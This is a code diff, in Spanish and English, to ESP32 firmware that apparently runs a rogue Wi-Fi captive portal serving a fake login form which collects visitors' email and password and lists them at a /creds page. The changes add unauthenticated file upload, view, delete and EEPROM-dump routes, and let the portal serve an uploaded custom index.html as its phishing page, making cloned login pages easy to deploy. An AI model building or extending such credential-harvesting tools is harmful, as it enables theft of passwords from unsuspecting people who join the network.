@@ -60,7 +60,193 @@ IPAddress AP_GATEWAY(172, 0, 0, 1);  // Gateway
 unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
 DNSServer dnsServer;
 WebServer webServer(80);
+///////incio drplaga
+void handleFileUpload() {
+  HTTPUpload& upload = webServer.upload();
 
+  if (upload.status == UPLOAD_FILE_START) {
+    String filename = "/" + upload.filename;
+    Serial.print("Starting upload of file: ");
+    Serial.println(filename);
+    if (LittleFS.exists(filename)) {
+      LittleFS.remove(filename);  // Elimina el archivo existente
+    }
+    File file = LittleFS.open(filename, "w");
+    if (!file) {
+      Serial.println("Failed to open file for writing");
+      return;
+    }
+    file.close();
+  } else if (upload.status == UPLOAD_FILE_WRITE) {
+    String filename = "/" + upload.filename;
+    File file = LittleFS.open(filename, "a");
+    if (file) {
+      file.write(upload.buf, upload.currentSize);
+      file.close();
+    } else {
+      Serial.println("Failed to append to file");
+    }
+  } else if (upload.status == UPLOAD_FILE_END) {
+    Serial.print("File successfully uploaded: ");
+    Serial.println(upload.filename);
+    webServer.send(200, "text/plain", "File uploaded successfully");
+  }
+}
+
+void handlefileseeprom() {
+  String output = "<html><head><title>Contenido EEPROM</title>";
+  output += "<style>";
+  output += "body { font-family: Arial, sans-serif; text-align: center; }";
+  output += "table { margin: auto; border-collapse: collapse; width: 80%; max-width: 600px; }";
+  output += "th, td { border: 1px solid #ddd; padding: 8px; }";
+  output += "th { background-color: #4CAF50; color: white; }";
+  output += "@media screen and (max-width: 600px) {";
+  output += "  table { width: 100%; }";
+  output += "}";
+  output += "</style>";
+  output += "</head><body>";
+  output += "<h2>Contenido de EEPROM</h2>";
+
+  output += "<table><tr><th>Dirección</th><th>Valor</th></tr>";
+
+  // Leer los primeros 512 bytes de la EEPROM
+  for (int i = 0; i < 512; i++) {
+    byte value = EEPROM.read(i);
+    output += "<tr><td>" + String(i) + "</td><td>" + String(value) + "</td></tr>";
+  }
+  output += "</table>";
+  output += "</body></html>";
+
+  webServer.send(200, "text/html", output);
+}
+
+void handlefiles() {
+  if (!LittleFS.begin()) {
+    String output = "<html><head><title>Error</title></head><body>";
+    output += "<h2>Error al iniciar LittleFS</h2>";
+    output += "<p>No se pudo acceder al sistema de archivos. Inténtalo de nuevo o verifica la configuración.</p>";
+    output += "</body></html>";
+    webServer.send(500, "text/html", output);
+    return;
+  }
+
+  String output = "<html><head><title>Lista de Archivos</title>";
+  output += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
+  output += "<style>";
+  output += "body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }";
+  output += ".container { width: 100%; max-width: 600px; margin: auto; }";
+  output += "table { width: 100%; border-collapse: collapse; margin-top: 20px; }";
+  output += "th, td { border: 1px solid #ddd; padding: 8px; word-break: break-all; }";
+  output += "th { background-color: #4CAF50; color: white; }";
+  output += "td { text-align: left; }";
+  output += "a { color: #1a73e8; text-decoration: none; }";
+  output += "a:hover { text-decoration: underline; }";
+  output += ".delete-btn { color: red; cursor: pointer; text-decoration: none; }";
+  output += "@media screen and (max-width: 600px) {";
+  output += "  body { font-size: 16px; }";
+  output += "  th, td { font-size: 14px; padding: 6px; }";
+  output += "}";
+  output += "</style>";
+  output += "</head><body>";
+  output += "<div class='container'>";
+  output += "<h2>Archivos Almacenados</h2>";
+
+  output += "<p>Espacio Total: " + String(LittleFS.totalBytes() / 1024.0, 2) + " KB</p>";
+  output += "<p>Espacio Utilizado: " + String(LittleFS.usedBytes() / 1024.0, 2) + " KB</p>";
+  output += "<p>Espacio Libre: " + String((LittleFS.totalBytes() - LittleFS.usedBytes()) / 1024.0, 2) + " KB</p>";
+
+  output += "<table><tr><th>Nombre del Archivo</th><th>Acciones</th></tr>";
+
+  File root = LittleFS.open("/");
+  if (root && root.isDirectory()) {
+    File file = root.openNextFile();
+    while (file) {
+      String fileName = String(file.name());
+      output += "<tr><td><a href='/view?name=" + fileName + "' target='_blank'>" + fileName + "</a></td>";
+      output += "<td><a href='/delete?name=" + fileName + "' class='delete-btn'>Eliminar</a></td></tr>";
+      file = root.openNextFile();
+    }
+  }
+  output += "</table>";
+  output += "</div>";
+  output += "</body></html>";
+
+  webServer.send(200, "text/html", output);
+}
+
+void handleFileDelete() {
+  if (!webServer.hasArg("name")) {
+    webServer.send(400, "text/plain", "Missing 'name' parameter");
+    return;
+  }
+
+  String fileName = "/" + webServer.arg("name");
+  if (!LittleFS.exists(fileName)) {
+    webServer.send(404, "text/plain", "File not found");
+    return;
+  }
+
+  LittleFS.remove(fileName);
+  webServer.send(200, "text/html", "<html><body><h2>Archivo eliminado</h2><p>El archivo <b>" + fileName.substring(1) + "</b> ha sido eliminado.</p><a href='/files'>Regresar a archivos</a></body></html>");
+}
+
+
+
+void handleFileView() {
+  if (!webServer.hasArg("name")) {
+    webServer.send(400, "text/plain", "Missing 'name' parameter");
+    return;
+  }
+
+  String fileName = "/" + webServer.arg("name");
+  if (!LittleFS.exists(fileName)) {
+    webServer.send(404, "text/plain", "File not found");
+    return;
+  }
+
+  File file = LittleFS.open(fileName, "r");
+  String contentType = "text/plain";
+  
+  // Detección simple del tipo de contenido
+  if (fileName.endsWith(".html")) contentType = "text/html";
+  else if (fileName.endsWith(".css")) contentType = "text/css";
+  else if (fileName.endsWith(".js")) contentType = "application/javascript";
+  else if (fileName.endsWith(".jpg")) contentType = "image/jpeg";
+  else if (fileName.endsWith(".png")) contentType = "image/png";
+
+  webServer.streamFile(file, contentType);
+  file.close();
+}
+
+
+String uploadPage_GET() {
+  return "<!DOCTYPE html>"
+         "<html>"
+         "<head>"
+         "<title>Subir Archivo</title>"
+         "<meta charset='UTF-8'>"
+         "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+         "<style>"
+         "body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }"
+         ".container { max-width: 500px; margin: auto; }"
+         "input[type='file'] { display: block; margin: 20px auto; }"
+         ".submit-btn { background: #4CAF50; color: white; padding: 10px 20px; border: none; cursor: pointer; }"
+         ".submit-btn:hover { background: #45a049; }"
+         "</style>"
+         "</head>"
+         "<body>"
+         "<div class='container'>"
+         "<h2>Subir Archivo a LittleFS</h2>"
+         "<form method='POST' action='/upload' enctype='multipart/form-data'>"
+         "<input type='file' name='file' required>"
+         "<button type='submit' class='submit-btn'>Subir Archivo</button>"
+         "</form>"
+         "</div>"
+         "</body>"
+         "</html>";
+}
+
+////fin
 void setSSID(String ssid){
   #if defined USE_EEPROM
   Serial.printf("Writing %d bytes of SSID to EEPROM\n", ssid.length());
@@ -219,15 +405,24 @@ String creds_GET() {
 }
 
 String index_GET() {
-  String loginTitle = String(LOGIN_TITLE);
-  String loginSubTitle = String(LOGIN_SUBTITLE);
-  String loginEmailPlaceholder = String(LOGIN_EMAIL_PLACEHOLDER);
-  String loginPasswordPlaceholder = String(LOGIN_PASSWORD_PLACEHOLDER);
-  String loginMessage = String(LOGIN_MESSAGE);
-  String loginButton = String(LOGIN_BUTTON);
-
-  return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>");
+  if (LittleFS.exists("/index.html")) {
+    File file = LittleFS.open("/index.html", "r");
+    String htmlContent = file.readString();
+    file.close();
+    return htmlContent;
+  } else {
+    // Carga y retorna el HTML predeterminado si no hay archivo index.html en LittleFS
+    return getHtmlContents("<center><div class='containertitle'>" + String(LOGIN_TITLE) + "</div>"
+                           "<div class='containersubtitle'>" + String(LOGIN_SUBTITLE) + "</div></center>"
+                           "<form action='/post' id='login-form'>"
+                           "<input name='email' class='input-field' type='text' placeholder='" + String(LOGIN_EMAIL_PLACEHOLDER) + "' required>"
+                           "<input name='password' class='input-field' type='password' placeholder='" + String(LOGIN_PASSWORD_PLACEHOLDER) + "' required />"
+                           "<div class='containermsg'>" + String(LOGIN_MESSAGE) + "</div>"
+                           "<div class='containerbtn'><button id='submitbtn' class='submit-btn' type='submit'>" + String(LOGIN_BUTTON) + "</button></div>"
+                           "</form>");
+  }
 }
+
 
 String index_POST() {
   String email = getInputValue("email");
@@ -309,6 +504,24 @@ void setupWebServer() {
   Serial.println("Registering /creds");
   webServer.on("/creds", []() {
     webServer.send(HTTP_CODE, "text/html", creds_GET());
+  });
+   Serial.println("Registering /files"); 
+  webServer.on("/files", []() { 
+    handlefiles(); 
+  });
+  webServer.on("/view", HTTP_GET, handleFileView);
+
+  webServer.on("/upload", HTTP_POST, []() {
+  webServer.send(200);  // Respuesta para la solicitud POST
+}, handleFileUpload);  // Función de manejo de archivo
+webServer.on("/uploadpage", HTTP_GET, []() {
+  webServer.send(200, "text/html", uploadPage_GET());
+});
+webServer.on("/delete", HTTP_GET, handleFileDelete);
+
+  Serial.println("Registering /eeprom");
+  webServer.on("/eeprom", []() { 
+    handlefileseeprom(); 
   });
   Serial.println("Registering /clear");
   webServer.on("/clear", []() {
